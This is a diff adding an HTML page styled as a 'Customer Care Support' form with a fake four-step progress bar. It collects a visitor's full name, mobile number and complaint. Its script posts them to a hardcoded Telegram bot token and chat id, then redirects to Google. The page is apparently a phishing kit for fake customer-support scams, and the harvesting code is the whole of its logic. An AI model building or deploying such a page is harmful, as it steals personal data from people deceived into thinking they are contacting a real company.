@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Customer Support Form</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #ecf0f1;
+  }
+
+  .header {
+    padding: 10px 0;
+    text-align: center;
+    background-color:litegray; /* Assuming you want to keep the blue background */
+  }
+
+  .header img {
+    max-width: 100%;
+    height: auto;
+  }
+
+  .customer-service-text {
+    text-align: center;
+    color: black;
+    font-size: 24px;
+    margin-top:20px; /* Adjust as needed to bring the text closer to the banner */
+  }
+
+  .progress-bar {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    padding: 10px 0;
+    margin-top:10px; 
+  }
+
+  .circle {
+    width: 25px;
+    height: 25px;
+    background-color: #dcdde1;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: black;
+    font-weight: bold;
+  }
+
+  .active {
+    background-color: #2ecc71;
+    color: white;
+  }
+
+  .form-container {
+    background: white;
+    width: 80%;
+    max-width: 500px;
+    margin: 20px auto;
+    padding: 20px;
+    border: 2px solid #2ecc71; /* Green border */
+    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+    border-radius: 15px; /* Rounded corners for the container */
+  }
+
+  .form-field {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    margin-bottom: 20px;
+    border: 1px solid #2ecc71; /* Green border */
+    background-color: #e9f5eb; /* Light green background */
+    border-radius: 15px; /* Rounded corners for fields */
+    box-sizing: border-box;
+  }
+
+  .submit-btn {
+    width: 100%;
+    padding: 10px;
+    background-color: #2ecc71;
+    border: none;
+    border-radius: 15px; /* Rounded corners for button */
+    color: white;
+    cursor: pointer;
+  }
+
+  .submit-btn:hover {
+    background-color: #27ae60;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <img src="https://thumbor.forbes.com/thumbor/fit-in/960x/https://www.forbes.com/advisor/wp-content/uploads/2022/03/Image_-_Customer_service_rep_.jpeg.jpg" alt="Customer Care Support Banner">
+  <div class="customer-service-text">CUSTOMER CARE SUPPORT INSTENT SOLUTION </div>
+</div>
+
+<div class="progress-bar">
+  <div class="circle active">1</div>
+  <div class="circle">2</div>
+  <div class="circle">3</div>
+  <div class="circle">4</div>
+</div>
+
+<div class="form-container">
+  <form id="support-form" onsubmit="sendToTelegram(event)">
+    <input type="text" id="full-name" name="full-name" class="form-field" placeholder="Full Name*" required>
+    <input type="text" id="mobile-number" name="mobile-number" class="form-field" placeholder="Mobile Number*" required>
+    <textarea id="complaint" name="complaint" class="form-field" placeholder="Complain *" rows="4" required></textarea>
+    <button type="submit" class="submit-btn">Next</button>
+  </form>
+</div>
+
+<script>
+function sendToTelegram(event) {
+  event.preventDefault();
+  
+  // Construct the message
+  var fullName = document.getElementById('full-name').value;
+  var mobileNumber = document.getElementById('mobile-number').value;
+  var complaint = document.getElementById('complaint').value;
+  var message = "Full Name: " + fullName + "\nMobile Number: " + mobileNumber + "\nComplaint: " + complaint;
+
+  // Telegram Bot API request setup
+  var request = new XMLHttpRequest();
+  request.open('POST', 'https://api.telegram.org/bot6331212716:AAEOc0OrDcquVBMu7OSg_9ox7X71lB5yP5w/sendMessage', true);
+  request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  request.onreadystatechange = function() {
+    if (request.readyState === 4 && request.status === 200) {
+      // Redirect to Google after successful submission
+      window.location.href = 'https://www.google.com';
+    }
+  };
+  
+  // Send the message
+  request.send('chat_id=5751079438&text=' + encodeURIComponent(message));
+}
+</script>
+
+</body>
+</html>
